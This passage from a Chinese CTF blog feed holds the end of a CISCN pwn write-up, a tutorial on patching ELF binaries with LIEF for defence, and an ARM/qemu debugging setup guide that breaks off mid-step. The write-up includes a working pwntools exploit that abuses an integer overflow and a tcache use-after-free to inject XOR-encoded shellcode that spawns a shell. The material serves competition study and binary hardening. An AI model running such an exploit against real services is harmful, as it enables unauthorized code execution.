&gt; v3 )</span><br><span class="line">     break;</span><br><span class="line">   a1[i] ^= a1[i + 1];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>整个题目的思路是一步步引导过去的，一步步处理就行。</p><ol><li><p>因为使用的/dev/urandom，这个肯定是无法绕过的，所以要看在else处的处理，很明显是要整数溢出，好在带了个ACMer，-256<em>256</em>256这个数字脱口而出惊呆了hhh</p></li><li><p>想要让执行到后面的输入shellcode，就需要改变那个地方的值，中间只给了malloc和free，同时还有UAF的洞，很明显是个tcache的UAF，直接写就完事了</p></li><li><p>进入到输入shellcode，对其进行变换并执行，我们将其反过来变换就行了，这里多输入两位防止后面的被xor掉</p></li></ol><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./pwn&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;172.16.9.24&apos;,&apos;9017&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;123456789012&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;-2147483648&apos;)</span><br><span class="line"></span><br><span class="line">def new(size,con):</span><br><span class="line">    sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;&gt; &apos;,str(size))</span><br><span class="line">    sh.sendafter(&apos;&gt; &apos;,con)</span><br><span class="line"></span><br><span class="line">def dele():</span><br><span class="line">    sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">new(0x30,&apos;a\n&apos;)</span><br><span class="line">dele()</span><br><span class="line">dele()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">new(0x30,&apos;\x90&apos;)</span><br><span class="line">new(0x30,&apos;a&apos;)</span><br><span class="line">new(0x30,&apos;The cake is a lie!\0&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">shellcode = bytearray(asm(shellcraft.amd64.sh(),arch=&apos;amd64&apos;))</span><br><span class="line">print str(shellcode)</span><br><span class="line">print len(shellcode)</span><br><span class="line">for i in range(len(shellcode)-2,-1,-1):</span><br><span class="line">    shellcode[i]=chr(shellcode[i]^shellcode[i+1])</span><br><span class="line"></span><br><span class="line">print shellcode</span><br><span class="line">print len(shellcode)</span><br><span class="line">#print sh2</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,str(shellcode)+&apos;\0\0\0&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;前几天去成都参加了信安大赛的总决赛，被师傅们吊起来打hhh，最后混了个二等奖，虽然说成绩不是特别好，但是自己菜不能怪别人嘛，继续努力吧，需要学的还有很多呢&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;5&quot;&gt;&lt;a href=&quot;#5&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwn patch method</title>
    <link href="http://siriuswhiter.tk/2019/07/20/pwn-patch-method/"/>
    <id>http://siriuswhiter.tk/2019/07/20/pwn-patch-method/</id>
    <published>2019-07-20T05:53:07.000Z</published>
    <updated>2019-08-22T00:50:31.933Z</updated>
    
    <content type="html"><![CDATA[<p><em>国赛半决赛的时候需要fix，因为没有做太多准备，第一天直接用的ida，第二天用的keypatch插件，但是效果都不是太好，感觉很水，所以单独学习一下</em></p><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="keypatch"><a href="#keypatch" class="headerlink" title="keypatch"></a>keypatch</h2><p>说到patch容易看到的一款ida的插件了，用法倒是很简单，<br><a href="https://github.com/keystone-engine/keypatch" target="_blank" rel="noopener">https://github.com/keystone-engine/keypatch</a> 下载完毕后放到ida的插件目录下重启ida就ok了</p><h2 id="lief"><a href="#lief" class="headerlink" title="lief"></a>lief</h2><p>刚发现的一款神器，可以对elf，pe等多种格式的文件进行修改<br>python 使用直接pip安装即可</p><h1 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h1><p>这里主要使用lief</p><h2 id="直接修改库的函数"><a href="#直接修改库的函数" class="headerlink" title="直接修改库的函数"></a>直接修改库的函数</h2><p>如果程序使用了system来getshell，如果是已经动态链接的话，实际上是可以将它给改为其他函数的</p><p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">    return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果是正常的程序，运行就可以直接拿到shell</p><p>我们编写一份patch.py，就是简单的将system换为puts</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import lief</span><br><span class="line"></span><br><span class="line">bin = lief.parse(&apos;main&apos;)</span><br><span class="line">system_off = filter(lambda e:e.name == &quot;system&quot;,bin.imported_symbols)[0]</span><br><span class="line">system_off.name = &quot;puts&quot;</span><br><span class="line">bin.write(&quot;main_patch&quot;)</span><br></pre></td></tr></table></figure><p>效果展示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/test/test2$ ./main</span><br><span class="line">$ ls</span><br><span class="line">main  main.c  main_patch  patch.py </span><br><span class="line">$ </span><br><span class="line">sirius@ubuntu:~/tikool/test/test2$ python patch.py </span><br><span class="line">done</span><br><span class="line">sirius@ubuntu:~/tikool/test/test2$ ./main_patch </span><br><span class="line">/bin/sh</span><br><span class="line">sirius@ubuntu:~/tikool/test/test2$</span><br></pre></td></tr></table></figure><h2 id="修改导入库的函数"><a href="#修改导入库的函数" class="headerlink" title="修改导入库的函数"></a>修改导入库的函数</h2><p>这里就跟着lief的官方文档来进行实验</p><p>主程序，会调用exp函数求e的n次幂<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//gcc main.c -o main -lm</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    if (argc != 2) &#123;</span><br><span class="line">        printf(&quot;Usage: %s &lt;a&gt; \n&quot;, argv[0]);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    double a = atoi(argv[1]);</span><br><span class="line">    printf(&quot;exp(%lf) = %lf\n&quot;, a, exp(a));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因为该函数是在libm.so.6中，我们将其复制到当前目录，编写hook，生成库</p><p>这里hook函数用来计算平方值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span><br><span class="line">double hook(double x)&#123;</span><br><span class="line">        return x*x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写patch.py，这里是在libm中新添加了一个段来添加后面新加的exp函数，最后将其写入libm.so.6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import lief</span><br><span class="line"></span><br><span class="line">main = lief.parse(&apos;main&apos;)</span><br><span class="line">libm = lief.parse(&apos;libm.so.6&apos;)</span><br><span class="line">hook = lief.parse(&apos;hook&apos;)</span><br><span class="line"></span><br><span class="line">segment_add = libm.add(hook.segments[0])</span><br><span class="line">print &quot;hook inserted at VA: 0x&#123;:06x&#125;&quot;.format(segment_add.virtual_address)</span><br><span class="line"></span><br><span class="line">exp_symbol = libm.get_symbol(&quot;exp&quot;)</span><br><span class="line">hook_symbol = hook.get_symbol(&quot;hook&quot;)</span><br><span class="line">exp_symbol.value = segment_add.virtual_address + hook_symbol.value</span><br><span class="line"></span><br><span class="line">libm.write(&quot;libm.so.6&quot;)</span><br></pre></td></tr></table></figure><p>查看效果，因为默认使用的是系统库，所以正常，优先使用当前目录的库时，原来的exp变为平方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/test/test3$ ldd main</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007ffff7ace000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7704000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)</span><br><span class="line">sirius@ubuntu:~/tikool/test/test3$ ./main  2</span><br><span class="line">expl(2.000000) = 7.389056</span><br><span class="line">sirius@ubuntu:~/tikool/test/test3$ LD_LIBRARY_PATH=. ldd main</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">libm.so.6 =&gt; ./libm.so.6 (0x00007fffb7cbb000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fffb78f1000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)</span><br><span class="line">sirius@ubuntu:~/tikool/test/test3$ LD_LIBRARY_PATH=. ./main 2</span><br><span class="line">expl(2.000000) = 4.000000</span><br></pre></td></tr></table></figure><h2 id="特定地址函数patch"><a href="#特定地址函数patch" class="headerlink" title="特定地址函数patch"></a>特定地址函数patch</h2><p>例如UAF漏洞经常会结合其他漏洞一块存在，如果可以对free进行修补则可以在一定程度上对其进行维护</p><p>这里使用别的函数进行演示</p><p>主程序，就是两次输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">        int a=2;</span><br><span class="line">        printf(&quot;%d\n&quot;,a);</span><br><span class="line">        printf(&quot;%d\n&quot;,a);</span><br><span class="line">        return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>目标是将第一个printf修改成我们自己写的比如说write函数，将其使用汇编进行编写为hook</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span><br><span class="line">void myprintf(char *a,int b)&#123;</span><br><span class="line">        asm(</span><br><span class="line">                &quot;mov %rdi,%rsi\n&quot;</span><br><span class="line">                &quot;mov $0,%rdi\n&quot;</span><br><span class="line">                &quot;mov $0x20,%rdx\n&quot;</span><br><span class="line">                &quot;mov $0x1,%rax\n&quot;</span><br><span class="line">                &quot;syscall\n&quot;</span><br><span class="line">                );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编查看第一次printf的调用地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">40053f:89 c6                mov    esi,eax</span><br><span class="line">400541:bf f4 05 40 00       mov    edi,0x4005f4</span><br><span class="line">400546:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">40054b:e8 b0 fe ff ff       call   400400 &lt;printf@plt&gt;</span><br><span class="line">400550:8b 45 fc             mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">400553:89 c6                mov    esi,eax</span><br><span class="line">400555:bf f4 05 40 00       mov    edi,0x4005f4</span><br><span class="line">40055a:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">40055f:e8 9c fe ff ff       call   400400 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure></p><p>编写patch.py 这里是先将myprintf添加到main程序中，再修改函数调用部分为我们的myprintf_addr</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import lief</span><br><span class="line"></span><br><span class="line">def patch_call(file,where,end,arch=&apos;amd64&apos;):</span><br><span class="line">    length = p32((end-(where+5))&amp;0xffffffff)</span><br><span class="line">    order = &apos;\xe8&apos;+length</span><br><span class="line">    print disasm(order,arch=arch)</span><br><span class="line">    file.patch_address(where,[ord(i) for i in order])</span><br><span class="line">    file.write(&quot;main_patch&quot;)</span><br><span class="line"></span><br><span class="line">binary = lief.parse(&apos;main&apos;)</span><br><span class="line">hook = lief.parse(&apos;hook&apos;)</span><br><span class="line">segment_add = binary.add(hook.segments[0])</span><br><span class="line"></span><br><span class="line">myprintf = hook.get_symbol(&quot;myprintf&quot;)</span><br><span class="line">myprintf_addr =  myprintf.value + segment_add.virtual_address</span><br><span class="line"></span><br><span class="line">patch_addr = 0x400584</span><br><span class="line">patch_call(binary,patch_addr,myprintf_addr)</span><br><span class="line">binary.write(&quot;main_patch&quot;)</span><br></pre></td></tr></table></figure><p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/test/test1$ ./main</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">sirius@ubuntu:~/tikool/test/test1$ python patch.py </span><br><span class="line">0x802000</span><br><span class="line">   0:   e8 8a 1d 40 00          call   0x401d8f</span><br><span class="line">sirius@ubuntu:~/tikool/test/test1$ ./main_patch </span><br><span class="line">%d</span><br><span class="line">;4�����8���P2</span><br></pre></td></tr></table></figure></p><p>效果很明显，但是看不出来第二个printf是否被影响了，查看反汇编确定修改成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">40053f:89 c6                mov    esi,eax</span><br><span class="line">400541:bf f4 05 40 00       mov    edi,0x4005f4</span><br><span class="line">400546:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">40054b:e8 8a 1d 40 00       call   8022da &lt;_end+0x20129a&gt;</span><br><span class="line">400550:8b 45 fc             mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">400553:89 c6                mov    esi,eax</span><br><span class="line">400555:bf f4 05 40 00       mov    edi,0x4005f4</span><br><span class="line">40055a:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">40055f:e8 9c fe ff ff       call   400400 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure><h2 id="直接修改got表"><a href="#直接修改got表" class="headerlink" title="直接修改got表"></a>直接修改got表</h2><p>这里我还不太确定其内部实际上与第一种是否相同</p><p>仍然使用第三次的程序，直接上patch.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import lief</span><br><span class="line"></span><br><span class="line">binary = lief.parse(&apos;main&apos;)</span><br><span class="line">hook = lief.parse(&apos;hook&apos;)</span><br><span class="line">segment_add = binary.add(hook.segments[0])</span><br><span class="line"></span><br><span class="line">myprintf = hook.get_symbol(&quot;myprintf&quot;)</span><br><span class="line">myprintf_addr =  myprintf.value + segment_add.virtual_address</span><br><span class="line">binary.patch_pltgot(&apos;printf&apos;,myprintf_addr)</span><br><span class="line"></span><br><span class="line">binary.write(&quot;main_patch&quot;)</span><br></pre></td></tr></table></figure><p>这里就是对printf的调用修改成了自定义的myprintf</p><p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/test/test1$ ./main_patch </span><br><span class="line">%d</span><br><span class="line">;4�����8���P%d</span><br><span class="line">;4�����8���P</span><br></pre></td></tr></table></figure></p><p>查看反汇编发现与修改前一致，应该是直接对got表进行了修改</p><h1 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h1><p>这个lief比较好用，就写了个小工具来方便patch，现在只有一个简单点指定地址长度的nop与针对UAF漏洞的free函数的patch2<br>如果需要的话看这里<a href="https://github.com/siriuswhiter/ELF-Patcher" target="_blank" rel="noopener">https://github.com/siriuswhiter/ELF-Patcher</a></p><p>需要提醒的是UAF的patch2是不能直接将其patch完成的，因为函数调用的姿势经常不尽相同，需要根据call free之前参数的传递方式来进行修改判断是否需要迁移代码。<br>如果运气比较好像这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000E64                 lea     rdx, ds:0[rax*8]</span><br><span class="line">.text:0000000000000E6C                 lea     rax, unk_202060</span><br><span class="line">.text:0000000000000E73                 mov     rax, [rdx+rax]</span><br><span class="line">.text:0000000000000E77                 mov     rax, [rax]</span><br><span class="line">.text:0000000000000E7A                 mov     rdi, rax        ; ptr</span><br><span class="line">.text:0000000000000E7D                 call    _free</span><br></pre></td></tr></table></figure></p><p>就完全不需要迁移，将0xE77 nop 掉就可以将指向ptr的指针传参进去了</p><p>而像下面这种，就需要进行部分迁移了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040094A                 push    rbp</span><br><span class="line">.text:000000000040094B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040094E                 mov     rax, cs:buf</span><br><span class="line">.text:0000000000400955                 mov     rdi, rax        ; ptr</span><br><span class="line">.text:0000000000400958                 call    _free</span><br><span class="line">.text:000000000040095D                 lea     rdi, aDone      ; &quot;Done!&quot;</span><br></pre></td></tr></table></figure></p><p>在使用时选择migration，指定起始地址为0x400955，结束地址为0x40095d，就可以将这两行进行迁移，<br>之后在IDA中将 mov  rax, cs:buf 改为 lea  rax, cs:buf 取地址即可</p><p><em>ps: 然后最后在比赛的时候完全没用着，14k的文件添加一个free的patch后会到达25k，然后因为过大而判定失败……，所以像国赛这样的patch可能就与LIEF无缘了</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;国赛半决赛的时候需要fix，因为没有做太多准备，第一天直接用的ida，第二天用的keypatch插件，但是效果都不是太好，感觉很水，所以单独学习一下&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;Tools&quot;&gt;&lt;a href=&quot;#Tools&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Arm-pwn 环境搭建及示例</title>
    <link href="http://siriuswhiter.tk/2019/07/13/arm-pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E7%A4%BA%E4%BE%8B/"/>
    <id>http://siriuswhiter.tk/2019/07/13/arm-pwn-环境搭建及示例/</id>
    <published>2019-07-13T02:36:41.000Z</published>
    <updated>2019-07-14T01:46:36.268Z</updated>
    
    <content type="html"><![CDATA[<p><em>为了搭建这个环境费了好多心思，也花了好久好久~~~，网上的教程大多都是arm的板子的调试，最后终于找到了简单合适的办法</em></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>在已经有了gdb ，pwntools等之前pwn需要的环境下来进行下面的搭建</p><ol><li><p>安装gdb-multiarch</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure></li><li><p>安装qemu，这个倒是不论在什么教程里都一定会有的，模拟跨平台神器，这里貌似只要安装qemu-user就可以了<br>binfmt*是用来识别文件类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br><span class="line">sudo apt-get install qemu-user-binfmt</span><br><span class="line">sudo apt-get install &quot;binfmt*&quot;</span><br></pre></td></tr></table></figure></li></ol><p>只用这两步就可以直接运行静态链接的arm程序，尝试打开jarvisoj的typo，正常运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/arm-test$ file typo</span><br><span class="line">typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br><span class="line">sirius@ubuntu:~/tikool/arm-test$ ./typo </span><br><span class="line">Let&apos;s Do Some Typing Exercise~</span><br><span class="line">Press Enter to get start;</span><br><span class="line">Input ~ if you want to quit</span><br><span class="line"></span><br><span class="line">------Begin------</span><br><span class="line">sour</span><br></pre></td></tr></table></figure></p><ol start="3"><li>下一步是为了能够运行动态链接的跨平台如arm的程序的</li></ol><p>查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search  &quot;libc6-&quot; | grep &apos;arm&apos;</span><br></pre></td></tr></table></figure></p><p>或利用tab补全来查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-*</span><br></pre></td></tr></table></figure></p><p>在其中寻找所需的架构对应的库，比如arm32用的是这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-armel-cross</span><br></pre></td></tr></table></figure></p><ol start="4"><li>运行方式，-L 指定运行库，-g 指定端口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/arm-linux-gnueabi  ./ciscn_2019_en_1</span><br></pre></td></tr></table></figure></li></ol><p><em>arm（大端）和armel（小端）区别在于存储方式，一个是大端（低序存在高地址，按顺序来），一个是小端序（将低序的存在低地址，反常识来）。其他如mips同理</em></p><p>这里使用信安大赛华北赛区的一道arm题来测试，不加参数-g可以直接运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/arm-test$ file ciscn_2019_en_1 </span><br><span class="line">ciscn_2019_en_1: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=1aaea66452d1dc8a477419b71a3ebaaad001ada1, stripped</span><br><span class="line">sirius@ubuntu:~/tikool/arm-test$ qemu-arm -L /usr/arm-linux-gnueabi  ./ciscn_2019_en_1 </span><br><span class="line">your name:</span><br><span class="line"></span><br><span class="line">aaaaaaaa</span><br><span class="line">hello aaaaaaaa</span><br></pre></td></tr></table></figure></p><ol start="5"><li>调试，之前一直就是调试这里搭不好，这里不需要用gdbserver。。</li></ol><p>首先让程序按上面的步骤在一个端口比如说1234跑起来，然后在另一边使用gdb-multiarch进行调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch  pwnname</span><br></pre></td></tr></table></figure></p><p>进入gdb后 set architecture 